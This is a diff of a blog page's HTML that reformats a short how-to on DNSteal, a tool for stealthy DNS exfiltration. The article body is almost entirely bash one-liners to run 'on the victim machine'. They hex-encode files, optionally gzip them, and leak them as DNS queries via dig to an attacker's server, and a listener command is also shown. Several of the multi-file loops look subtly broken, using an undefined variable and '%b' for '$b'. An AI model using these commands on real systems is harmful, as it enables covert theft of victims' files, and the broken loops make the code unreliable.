@@ -5,15 +5,15 @@
   
   <title>How To Send Files Stealthily To A Remote Machine Using &amp;#8220;DNSteal&amp;#8221; | hw-1</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="On the victim machine, you simply send the following command:for b in $(xxd -p file&#x2F;to&#x2F;send.png); do dig @server $b.filename.com; done   Support for multiple files for filename in $(ls); do for b in $">
+  <meta name="description" content="On the victim machine, you simply send the following command:1for b in $(xxd -p file&#x2F;to&#x2F;send.png); do dig @server $b.filename.com; done   Support for multiple files 1for filename in $(ls); do for b in">
 <meta property="og:type" content="article">
 <meta property="og:title" content="How To Send Files Stealthily To A Remote Machine Using &amp;#8220;DNSteal&amp;#8221;">
 <meta property="og:url" content="http://wirelessbox.net/2016/12/24/how-to-send-files-stealthily-to-a-remote-machine-using-dnsteal/index.html">
 <meta property="og:site_name" content="hw-1">
-<meta property="og:description" content="On the victim machine, you simply send the following command:for b in $(xxd -p file&#x2F;to&#x2F;send.png); do dig @server $b.filename.com; done   Support for multiple files for filename in $(ls); do for b in $">
+<meta property="og:description" content="On the victim machine, you simply send the following command:1for b in $(xxd -p file&#x2F;to&#x2F;send.png); do dig @server $b.filename.com; done   Support for multiple files 1for filename in $(ls); do for b in">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2016-12-23T23:09:48.000Z">
-<meta property="article:modified_time" content="2020-11-14T06:30:12.000Z">
+<meta property="article:modified_time" content="2020-11-18T01:05:10.497Z">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternate" href="/hw-1/atom.xml" title="hw-1" type="application/atom+xml">
@@ -105,24 +105,24 @@
 
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="On-the-victim-machine-you-simply-send-the-following-command"><a href="#On-the-victim-machine-you-simply-send-the-following-command" class="headerlink" title="On the victim machine, you simply send the following command:"></a>On the victim machine, you simply send the following command:</h3><pre class="brush: bash; title: ; notranslate" title="">for b in $(xxd -p file/to/send.png); do dig @server $b.filename.com; done
-</pre>
+        <h3 id="On-the-victim-machine-you-simply-send-the-following-command"><a href="#On-the-victim-machine-you-simply-send-the-following-command" class="headerlink" title="On the victim machine, you simply send the following command:"></a>On the victim machine, you simply send the following command:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> $(xxd -p file/to/send.png); <span class="keyword">do</span> dig @server <span class="variable">$b</span>.filename.com; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
 
 <p>Support for multiple files</p>
-<pre class="brush: bash; title: ; notranslate" title="">for filename in $(ls); do for b in $(xxd -p $f); do dig +short @server %b.$filename.com; done; done
-</pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> $(ls); <span class="keyword">do</span> <span class="keyword">for</span> b <span class="keyword">in</span> $(xxd -p <span class="variable">$f</span>); <span class="keyword">do</span> dig +short @server %b.<span class="variable">$filename</span>.com; <span class="keyword">done</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
 
 <p>It also supports gzip compression of the file to allow for faster transfer speeds, this can be achieved using the &#8220;-z&#8221; switch:</p>
-<pre class="brush: bash; title: ; notranslate" title="">python dnsteal.py 127.0.0.1 -z
-</pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dnsteal.py 127.0.0.1 -z</span><br></pre></td></tr></table></figure>
+
 
 <p>Then on the victim machine send a Gzipped file like so:</p>
-<pre class="brush: bash; title: ; notranslate" title="">for b in $(gzip -c file/to/send.png | xxd -p); do dig @server $b.filename.com; done
-</pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> $(gzip -c file/to/send.png | xxd -p); <span class="keyword">do</span> dig @server <span class="variable">$b</span>.filename.com; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
 
 <p>or for multiple, gzip compressed files:</p>
-<pre class="brush: bash; title: ; notranslate" title="">for filename in $(ls); do for b in $(gzip -c $filename | xxd -p); do dig +short @server %b.$filename.com; done; done
-</pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> $(ls); <span class="keyword">do</span> <span class="keyword">for</span> b <span class="keyword">in</span> $(gzip -c <span class="variable">$filename</span> | xxd -p); <span class="keyword">do</span> dig +short @server %b.<span class="variable">$filename</span>.com; <span class="keyword">done</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
       
     </div>
 
@@ -132,7 +132,7 @@
     
 
     <footer class="article-footer">
-      <a data-url="http://wirelessbox.net/2016/12/24/how-to-send-files-stealthily-to-a-remote-machine-using-dnsteal/" data-id="ckhhbad22000p98my2bzc8tv2" class="article-share-link">
+      <a data-url="http://wirelessbox.net/2016/12/24/how-to-send-files-stealthily-to-a-remote-machine-using-dnsteal/" data-id="ckhmph3i7000ph4y2610s3xch" class="article-share-link">
         <i class="fa fa-share"></i> Share
       </a>
       
